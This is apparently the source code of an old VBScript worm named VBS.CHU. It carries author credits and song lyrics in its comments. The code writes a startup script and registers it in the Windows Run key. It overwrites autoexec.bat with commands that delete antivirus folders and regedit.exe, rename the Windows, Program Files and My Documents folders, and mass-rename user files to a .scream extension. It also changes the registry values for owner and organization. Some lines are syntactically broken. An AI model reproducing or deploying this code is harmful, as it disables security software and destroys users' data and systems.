On Error Resume Next
Rem Author:   OngES 
Rem Name:     VBS.CHU
Rem Comments: greets to China hackers!
Rem Origin:   Singapore
Rem With such confusion
Rem Don't it make you want to SREAM!
Rem Your Bash Abusing Victimized within the SREAM
Rem You try to cope with every lie they scrutinize
Rem Somebody please have MERCY on me cause I just can't take it
Rem  ______
Rem |        |      |   |      |
Rem |        |      |   |      |
Rem |        |______|   |      |
Rem |        |      |   |      |
Rem |        |      |   |      |
Rem |______  |      |   |______|
Rem 
Rem Scream all you wish.. I adore chU.. 
Rem
chuchu=file.ReadAll


Set ginseng = CreateObject("WScript.Shell")

   Dim fso, cat
   Set fso = CreateObject("Scripting.FileSystemObject")
   Set cat = fso.CreateTextFile("c:\windows\rundll32.vbs", True)
   
   cat.WriteLine("'Display msg")       
   cat.WriteBlankLines(2) 
   
   cat.Write("MsgBox " & """Sream!""")
   
   cat.Close

Set cat = fso.CreateTextFile("c:\autoexec.bat", True)
  
   cat.WriteLine("@echo off")
   cat.WriteLine("cls") 
   cat.WriteLine("echo Now removing those worthless antivirus programs from computer :-)...") 
   cat.WriteLine("echo.") 
   cat.WriteLine("deltree /y c:\progra~1\Antivi~1\") 
   cat.WriteLine("deltree /y c:\progra~1\AVPsha~1\") 
   cat.WriteLine("deltree /y c:\progra~1\Networ~1\") 
   cat.WriteLine("deltree /y c:\progra~1\mcafee\")
   cat.WriteLine("deltree /y c:\progra~1\Norton~1\")
   cat.WriteLine("deltree /y c:\progra~1\trends~1\")
   cat.WriteLine("deltree /y c:\progra~1\FSI\")
   cat.WriteLine("deltree /y c:\Windows\regedit.exe")
   cat.WriteLine "@echo off"
   cat.WriteLine "echo SCREAM!!!!  >> c:\autoexec.bat"
   cat.WriteLine "echo Where is chU ?  >> c:\config.sys"
   cat.WriteLine "@REN c:\Windows  CatFish"
   cat.WriteLine "@REN C:\Progra~1 SAID"
   cat.WriteLine "@REN C:\MyDocu~1 SCREAM"
   cat.WriteLine "rename *.txt *.scream"
   cat.WriteLine "rename *.jpg *.scream"
   cat.WriteLine "rename *.bmp *.scream"
   cat.WriteLine "rename *.sys *.scream"
   cat.WriteLine "md C:\TRUST"
   cat.WriteLine "md C:\NO"
   cat.WriteLine "md C:\ONE"
   cat.WriteLine "md C:\THE"
   cat.WriteLine "md C:\X-FILES"
   cat.WriteLine "md C:\REOPENED"
   cat.WriteLine "md c:\YoU"
   cat.WriteLine "md C:\HaVE"
   cat.WriteLine "md C:\BeeN"
   cat.WriteLine "md C:\ScReAM"
   cat.WriteLine "md C:\bY_CaTfiSh"
   cat.WriteLine " YoUr NeW diRecToriEs has beEn adDed"
   cat.WriteLine " I hoPE yoU eNjoY thiS WORm..."
   cat.WriteLine " UntIl NeXt TimE!"
   cat.WriteLine("ver") 

   cat.Close 

ginseng.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner","chU&jER"
ginseng.RegWrite
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOrganization","chU&jER"
ginseng.RegWrite 
"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run\" & "Windows Task", ( "c:\windows\rundll32.vbs" )
